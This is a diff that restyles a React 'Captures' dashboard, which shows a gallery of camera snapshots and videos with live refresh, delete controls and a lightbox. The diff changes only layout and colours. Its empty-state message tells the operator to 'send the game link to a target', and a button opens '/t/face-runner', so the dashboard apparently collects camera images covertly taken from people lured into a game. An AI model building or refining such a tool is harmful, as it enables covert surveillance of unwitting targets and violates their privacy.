@@ -55,36 +55,36 @@ export default function Captures() {
   const isVideo = (ft: string) => ft.includes('video')
 
   return (
-    <div className="space-y-4">
-      <div className="flex items-center justify-between flex-wrap gap-3">
+    <div className="space-y-4 stagger">
+      <div className="flex items-center justify-between flex-wrap gap-3 animate-fade-in">
         <div>
-          <h2 className="text-2xl font-bold text-white">Captures</h2>
-          <p className="text-sm text-gray-500 mt-1">{captures.length} camera snapshots</p>
+          <h1 className="text-xl font-bold text-primary">Captures</h1>
+          <p className="text-sm text-tertiary mt-0.5">{captures.length} camera snapshots</p>
         </div>
         <div className="flex gap-2">
-          <select value={sort} onChange={e => setSort(e.target.value)} className="bg-gray-900 border border-gray-800 rounded-lg px-3 py-1.5 text-sm text-gray-300 focus:outline-none focus:border-cyan-500">
+          <select value={sort} onChange={e => setSort(e.target.value)} className="select-apple">
             <option value="newest">Newest</option>
             <option value="oldest">Oldest</option>
             <option value="largest">Largest</option>
           </select>
-          <button onClick={() => setAutoRefresh(!autoRefresh)} className={`px-3 py-1.5 rounded-lg text-xs font-medium ${autoRefresh ? 'bg-green-500/10 text-green-400' : 'bg-gray-800 text-gray-500'}`}>
+          <button onClick={() => setAutoRefresh(!autoRefresh)} className={`select-apple cursor-pointer ${autoRefresh ? 'accent-bg accent' : ''}`}>
             {autoRefresh ? '● Live' : 'Paused'}
           </button>
-          <button onClick={refresh} className="px-3 py-1.5 bg-gray-800 text-gray-300 rounded-lg text-sm hover:bg-gray-700">🔄</button>
+          <button onClick={refresh} className="select-apple cursor-pointer">⟳</button>
           {captures.length > 0 && (
-            <button onClick={delAll} className="px-3 py-1.5 bg-red-500/10 text-red-400 rounded-lg text-sm hover:bg-red-500/20">🗑 All</button>
+            <button onClick={delAll} className="select-apple cursor-pointer" style={{ color: 'var(--accent)' }}>🗑 All</button>
           )}
         </div>
       </div>
 
       {loading ? (
-        <div className="flex justify-center py-20"><div className="animate-spin w-8 h-8 border-2 border-cyan-500 border-t-transparent rounded-full"></div></div>
+        <div className="flex justify-center py-20"><div className="spinner"></div></div>
       ) : captures.length === 0 ? (
-        <div className="text-center py-24 text-gray-600">
-          <div className="text-6xl mb-4 opacity-20">📷</div>
-          <h3 className="text-lg text-gray-400">No captures yet</h3>
-          <p className="text-sm mt-2">Send the game link to a target. Captures appear here in real-time.</p>
-          <a href="/t/face-runner" target="_blank" rel="noreferrer" className="inline-block mt-4 px-4 py-2 bg-cyan-500/10 text-cyan-400 rounded-lg text-sm hover:bg-cyan-500/20">🎮 Open Game</a>
+        <div className="empty-state animate-fade-in">
+          <div className="icon">📷</div>
+          <h3>No captures yet</h3>
+          <p>Send the game link to a target. Captures appear here in real-time.</p>
+          <a href="/t/face-runner" target="_blank" rel="noreferrer" className="inline-block mt-5 px-4 py-2 nav-link active">🎮 Open Game</a>
         </div>
       ) : (
         <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-3">
@@ -94,24 +94,25 @@ export default function Captures() {
               <div
                 key={c.id}
                 onClick={() => setLightbox(i)}
-                className={`group relative bg-gray-900 border rounded-xl overflow-hidden cursor-pointer transition-all hover:-translate-y-1 hover:shadow-xl ${
-                  recent ? 'border-green-500/60 shadow-lg shadow-green-500/10' : 'border-gray-800 hover:border-gray-700'
+                className={`group relative bg-secondary border-subtle radius-card overflow-hidden cursor-pointer transition-all duration-200 animate-scale-in hover:-translate-y-1 shadow-card ${
+                  recent ? 'shadow-card-lg' : ''
                 }`}
+                style={{ animationDelay: `${i * 0.03}s`, animationFillMode: 'both' }}
               >
                 {isVideo(c.file_type) ? (
-                  <div className="h-32 flex items-center justify-center bg-gray-950 text-4xl">🎬</div>
+                  <div className="h-32 flex items-center justify-center bg-primary text-4xl">🎬</div>
                 ) : (
                   <img src={c.url} alt={c.filename} loading="lazy" className="h-32 w-full object-cover" />
                 )}
                 {recent && (
-                  <div className="absolute top-2 left-2 px-2 py-0.5 bg-green-500/90 text-white text-[10px] font-bold rounded-full animate-pulse">NEW</div>
+                  <div className="absolute top-2 left-2 badge" style={{ background: 'var(--accent)', color: '#fff' }}>NEW</div>
                 )}
                 <button onClick={e => del(c.id, e)} className="absolute top-2 right-2 w-6 h-6 rounded-full bg-red-500/90 text-white text-xs opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">×</button>
-                <div className="p-2">
-                  <div className="text-xs text-gray-400 truncate">{c.filename}</div>
-                  <div className="flex justify-between mt-1">
-                    <span className="text-[10px] text-gray-600">{relTime(c.created_at)}</span>
-                    <span className="text-[10px] text-gray-600">{fmtSize(c.file_size)}</span>
+                <div className="p-2.5">
+                  <div className="text-xs text-secondary truncate">{c.filename}</div>
+                  <div className="flex justify-between mt-1.5">
+                    <span className="text-[10px] text-tertiary">{relTime(c.created_at)}</span>
+                    <span className="text-[10px] text-tertiary mono">{fmtSize(c.file_size)}</span>
                   </div>
                 </div>
               </div>
@@ -121,16 +122,17 @@ export default function Captures() {
       )}
 
       {lightbox !== null && captures[lightbox] && (
-        <div className="fixed inset-0 bg-black/95 z-50 flex items-center justify-center p-6" onClick={() => setLightbox(null)}>
+        <div className="fixed inset-0 z-50 flex items-center justify-center p-6 animate-scale-in" onClick={() => setLightbox(null)}
+          style={{ backgroundColor: 'rgba(0,0,0,0.92)' }}>
           <button className="absolute top-4 right-6 text-white/60 hover:text-white text-4xl" onClick={() => setLightbox(null)}>×</button>
           {lightbox > 0 && <button className="absolute left-4 top-1/2 -translate-y-1/2 text-white/40 hover:text-white text-4xl" onClick={e => { e.stopPropagation(); setLightbox(lightbox - 1) }}>‹</button>}
           {lightbox < captures.length - 1 && <button className="absolute right-4 top-1/2 -translate-y-1/2 text-white/40 hover:text-white text-4xl" onClick={e => { e.stopPropagation(); setLightbox(lightbox + 1) }}>›</button>}
           {isVideo(captures[lightbox].file_type) ? (
-            <video src={captures[lightbox].url} controls autoPlay className="max-w-[95%] max-h-[85vh] rounded-lg" />
+            <video src={captures[lightbox].url} controls autoPlay className="max-w-[95%] max-h-[85vh] radius-card-lg" />
           ) : (
-            <img src={captures[lightbox].url} className="max-w-[95%] max-h-[85vh] rounded-lg shadow-2xl" />
+            <img src={captures[lightbox].url} className="max-w-[95%] max-h-[85vh] radius-card-lg shadow-card-lg" />
           )}
-          <div className="absolute bottom-6 left-1/2 -translate-x-1/2 text-gray-400 text-sm bg-gray-900/80 px-4 py-2 rounded-lg">
+          <div className="absolute bottom-6 left-1/2 -translate-x-1/2 text-secondary text-sm px-4 py-2 radius-card" style={{ backgroundColor: 'var(--bg-glass)' }}>
             {captures[lightbox].filename} · {fmtSize(captures[lightbox].file_size)} · {relTime(captures[lightbox].created_at)}
           </div>
         </div>
